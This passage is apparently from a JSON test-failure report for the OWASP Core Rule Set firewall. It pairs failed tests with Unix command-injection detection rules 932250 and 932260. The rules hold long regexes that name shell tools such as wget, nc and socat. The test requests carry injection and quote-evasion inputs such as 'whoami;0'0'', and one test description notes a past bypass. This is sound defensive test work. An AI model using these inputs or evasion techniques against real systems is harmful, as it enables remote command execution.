]*)?\\x5c?)?h|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n)|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:3[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m|c)|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|z)|y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|l[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:4[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?))(?:[\\s\\x0b&\\),<>\\|]|$).*|a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?-[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*)|g[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|[hr][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932250
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Direct Unix Command Execution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932260",
    "test_id" : 12,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932260.yaml",
    "description" : "Remote Command Execution bypass with time",
    "cause" : "failed expect_id check: 932260 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "Remote Command Execution bypass with time",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=time+bsdtar+",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932260 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932260,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932250 for commands of 4 characters and up."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932260.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932260"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:^|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:a(?:ddgroup|nsible|pparmor_[^\\s\\x0b]{1,10}\\b|rj(?:-register|disp)|tobm(?:[\\s\\x0b&\\),<>\\|]|$)|u(?:ditctl|repot|search))|b(?:ase(?:32|64|nc)|(?:lkid|rwap|yobu)(?:[\\s\\x0b&\\),<>\\|]|$)|sd(?:cat|iff|tar)|u(?:iltin|nzip2|sybox)|z(?:c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|diff|e(?:grep|xe(?:[\\s\\x0b&\\),<>\\|]|$))|f?grep|ip2(?:[\\s\\x0b&\\),<>\\|]|$|recover)|less|more))|c(?:[89]9-gcc|h(?:(?:attr|mod|o(?:om|wn)|sh)(?:[\\s\\x0b&\\),<>\\|]|$)|ef-|g(?:passwd|rp(?:[\\s\\x0b&\\),<>\\|]|$))|pass)|lang\\+\\+|o(?:bc(?:[\\s\\x0b&\\),<>\\|]|$|run)|mm(?:[\\s\\x0b&\\),<>\\|]|$)|proc)|(?:p(?:an|io)|scli)(?:[\\s\\x0b&\\),<>\\|]|$))|d(?:(?:iff|mesg|vips)(?:[\\s\\x0b&\\),<>\\|]|$)|o(?:as(?:[\\s\\x0b&\\),<>\\|]|$)|cker-)|pkg(?:[\\s\\x0b&\\),\\-<>\\|]|$))|e(?:2fsck|(?:fax|grep|macs|nd(?:if|sw)|sac|xpr)(?:[\\s\\x0b&\\),<>\\|]|$))|f(?:d(?:(?:find|isk)(?:[\\s\\x0b&\\),<>\\|]|$)|u?mount)|grep(?:[\\s\\x0b&\\),<>\\|]|$)|iletest|ping(?:[\\s\\x0b&\\),6<>\\|]|$)|tp(?:stats|who))|g(?:(?:core|insh|z(?:cat|exe|ip))(?:[\\s\\x0b&\\),<>\\|]|$)|(?:etca|unzi)p|hc(?:-(?:[\\s\\x0b&\\),<>\\|]|$)|i(?:[\\s\\x0b&\\),\\-<>\\|]|$))|r(?:(?:cat|ep)(?:[\\s\\x0b&\\),<>\\|]|$)|oupmod))|(?:htop|jexec)(?:[\\s\\x0b&\\),<>\\|]|$)|i(?:(?:conv|ftop)(?:[\\s\\x0b&\\),<>\\|]|$)|pp(?:eveprinter|find|tool))|l(?:ast(?:comm(?:[\\s\\x0b&\\),<>\\|]|$)|log(?:in)?)|ess(?:echo|(?:fil|pip)e)|ftp(?:[\\s\\x0b&\\),<>\\|]|$|get)|osetup|s(?:(?:-F|cpu|hw|mod|of|pci|usb)(?:[\\s\\x0b&\\),<>\\|]|$)|b_release)|wp-download|z(?:4c(?:[\\s\\x0b&\\),<>\\|]|$|at)|c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|diff|[ef]?grep|less|m(?:a(?:[\\s\\x0b&\\),<>\\|]|$|dec|info)|ore)))|m(?:a(?:(?:ilq|wk)(?:[\\s\\x0b&\\),<>\\|]|$)|ster\\.passwd)|k(?:fifo|nod(?:[\\s\\x0b&\\),<>\\|]|$)|temp)|locate|ysql(?:[\\s\\x0b&\\),<>\\|]|$|admin|dump(?:slow)?|hotcopy|show))|n(?:(?:a(?:sm|wk)|(?:ma|ohu)p|ping|roff|stat)(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:\\.(?:openbsd|traditional)|at(?:[\\s\\x0b&\\),<>\\|]|$))|et(?:(?:c|st)at|kit-ftp|plan))|o(?:nintr|pkg(?:[\\s\\x0b&\\),<>\\|]|$))|p(?:d(?:b(?:2mb|3(?:[\\s\\x0b&\\),\\.<>\\|]|$))|ksh(?:[\\s\\x0b&\\),<>\\|]|$))|(?:er(?:f|l5?)|(?:ft|gre)p|i(?:gz|ng6)|(?:op|ush)d|s(?:ed|ql))(?:[\\s\\x0b&\\),<>\\|]|$)|hp(?:-cgi|[57](?:[\\s\\x0b&\\),<>\\|]|$))|k(?:exec|ill(?:[\\s\\x0b&\\),<>\\|]|$))|rint(?:env|f(?:[\\s\\x0b&\\),<>\\|]|$))|tar(?:[\\s\\x0b&\\),<>\\|]|$|diff|grep)|wd\\.db|y(?:3?versions|thon[23]))|r(?:(?:aku|bash|nano|pmdb|unc|vi(?:ew|m))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:alpath|boot(?:[\\s\\x0b&\\),<>\\|]|$))|m(?:dir(?:[\\s\\x0b&\\),<>\\|]|$)|t-(?:dump|tar)|user)|sync(?:-ssl|[\\s\\x0b&\\),<>\\|]|$))|s(?:(?:diff|ftp|lsh|ocat)(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:ndmail(?:[\\s\\x0b&\\),<>\\|]|$)|t(?:cap|env|sid))|h(?:\\.distrib|uf(?:[\\s\\x0b&\\),<>\\|]|$))|pwd\\.db|sh-(?:a(?:dd|gent)|copy-id)|td(?:err|in(?:[\\s\\x0b&\\),<>\\|]|$)|out)|udo(?:-rs|[\\s\\x0b&\\),<>_\\|]|$|edit|replay)|vn(?:a(?:dmin|uthz)|bench|dumpfilter|fsfs|look|mucc|rdump|s(?:erve|ync)|version)|ysctl)|t(?:(?:ailf|ftp|mux)(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:l?sh(?:[\\s\\x0b&\\),<>\\|]|$)|p(?:ing|traceroute))|elnet|r(?:aceroute6?|off(?:[\\s\\x0b&\\),<>\\|]|$)))|u(?:n(?:(?:iq|rar|xz)(?:[\\s\\x0b&\\),<>\\|]|$)|lz(?:4(?:[\\s\\x0b&\\),<>\\|]|$)|ma)|pigz|zstd)|ser(?:(?:ad|mo)d|del))|vi(?:(?:gr|pw|rsh)(?:[\\s\\x0b&\\),<>\\|]|$)|sudo(?:-rs)?)|w(?:get(?:[\\s\\x0b&\\),<>\\|]|$)|hoami)|x(?:(?:args|etex|more|pad|term)(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|d(?:ec(?:[\\s\\x0b&\\),<>\\|]|$)|iff)|[ef]?grep|less|more))|z(?:(?:c(?:at|mp)|diff|grep|less|run)(?:[\\s\\x0b&\\),<>\\|]|$)|[ef]grep|ip(?:c(?:loak|mp)|details|grep|info|(?:merg|not)e|split|tool)|mo(?:dload|re(?:[\\s\\x0b&\\),<>\\|]|$))|std(?:[\\s\\x0b&\\),<>\\|]|$|(?:ca|m)t|grep|less)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932260
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Direct Unix Command Execution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932260",
    "test_id" : 28,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932260.yaml",
    "description" : "Match despite quote evasion attempt.\n932260 accidentally contained a chain rule for some time that enabled\ntrivial bypasses, by excluding matches against number separators (see 932240).\n",
    "cause" : "failed expect_id check: 932260 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 28,
      "desc" : "Match despite quote evasion attempt.\n932260 accidentally contained a chain rule for some time that enabled\ntrivial bypasses, by excluding matches against number separators (see 932240).\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?a=whoami;0'0'\"",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932260 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932260,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932250 for commands of 4 characters and up."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
